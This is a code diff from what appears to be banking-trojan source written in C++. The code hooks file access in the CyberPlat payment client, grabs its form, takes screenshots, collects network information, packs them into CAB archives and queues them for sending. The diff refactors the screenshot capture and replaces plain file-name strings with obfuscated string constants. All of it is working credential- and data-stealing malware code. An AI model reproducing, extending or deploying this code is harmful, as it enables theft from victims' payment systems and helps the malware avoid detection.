@@ -2,8 +2,9 @@
 
 #include "CabPacker.h"
 #include "Loader.h"
-
+#include "ScreenShots.h"
 #include "String.h"
+#include "StrConsts.h"
 #include "CyberPlatDLL.h"
 
 #include "WndUtils.h"
@@ -99,33 +100,12 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 
 					MemFree( Buffer );
 
-					LPVOID lpFile;
-					DWORD dwFileSize;
-					GetScreen( &lpFile, &dwFileSize );
-					
-					bool bAddScreen  = false;
+
+                    // Создаём скриншот
 					PCHAR ScreenFile = File::GetTempNameA();
 					
-					if ( lpFile && ScreenFile )
-					{
-						HANDLE hScreen = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
-						
-						if ( hScreen != INVALID_HANDLE_VALUE )
-						{
-							
-							DWORD dwWritten = 0;
-
-							if ( (BOOL)pWriteFile( hScreen, lpFile, dwFileSize, &dwWritten, 0 ) )
-							{
-								bAddScreen = true;
-							}
-							
-						}
-
-						pCloseHandle( hScreen );
-					}			
-
-					MemFree( lpFile );
+					bool bAddScreen = ScreenShot::CaptureScreenA(ScreenFile);
+					//----------------------------------
 
 					if ( AddLog )
 					{
@@ -138,18 +118,18 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 
 							if ( hCab )
 							{
-								AddFileToCab( hCab, TempFile, "Information.txt" );
+								AddFileToCab( hCab, TempFile, GetStr(StrLogFileInformation).t_str());
 
 								if ( bAddScreen )
 								{
-									AddFileToCab( hCab, ScreenFile, "screen.jpeg" );
+									AddFileToCab( hCab, ScreenFile, GetStr(StrLogFileScreenShot).t_str());
 								}
 
 								char *NetFile = GetNetInfo();
 
 								if ( NetFile != NULL )
 								{
-									AddFileToCab( hCab, NetFile, "NetInfo.txt" );
+									AddFileToCab( hCab, NetFile, GetStr(StrLogFileNetInfo).t_str());
 									pDeleteFileA( NetFile );
 								}
 
@@ -583,35 +563,15 @@ bool GrabCyber( HWND hCyberForm )
 								}
 							}
 
-							LPVOID lpFile;
-							DWORD dwFileSize;
-							GetScreen( &lpFile, &dwFileSize );
 
-							bool bAddScreen  = false;
 							PCHAR ScreenFile = File::GetTempNameA();
+							bool bAddScreen  = ScreenShot::CaptureScreenA(ScreenFile);
 
-							if ( lpFile && ScreenFile )
-							{
-								HANDLE hScreen = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
 
-								if ( hScreen != INVALID_HANDLE_VALUE )
-								{
-									DWORD dwWritten = 0;
-
-									if ( (BOOL)pWriteFile( hScreen, lpFile, dwFileSize, &dwWritten, 0 ) )
-									{
-										bAddScreen = true;
-									}
-								}
-
-								pCloseHandle( hScreen );
-							}			
-
-							MemFree( lpFile );
 
 							if ( bAddScreen )
 							{
-								AddFileToCab( hCab, ScreenFile, "screen.jpeg" );
+								AddFileToCab( hCab, ScreenFile, GetStr(StrLogFileScreenShot).t_str());
 							}
 
 							pDeleteFileA( ScreenFile );
@@ -621,7 +581,7 @@ bool GrabCyber( HWND hCyberForm )
 
 							if ( NetFile != NULL )
 							{
-								AddFileToCab( hCab, NetFile, "NetInfo.txt" );
+								AddFileToCab( hCab, NetFile, GetStr(StrLogFileNetInfo).t_str());
 								pDeleteFileA( NetFile );
 							}
 							STR::Free(NetFile);
@@ -632,12 +592,7 @@ bool GrabCyber( HWND hCyberForm )
 
 							if ( pBank )
 							{
-//								pBank->FilePath = (char*)MemAlloc( m_lstrlen( CabName ) + 1 );
-//								pBank->dwType   = 4;
-//
-//								m_memcpy( pBank->FilePath, CabName, m_lstrlen( CabName ) );
-								
-//								StartThread( SendBSSInist, pBank );
+//		
 
 								DataGrabber::SendCabDelayed(NULL, CabName, "cyberplat");
 
@@ -765,8 +720,7 @@ bool HookCyberplatPC()
 		return false;
 	}
 	
-	InitScreenLib();
-	StartThread( CyberThread, NULL );	
+	StartThread( CyberThread, NULL );
 
 	return true;
 }
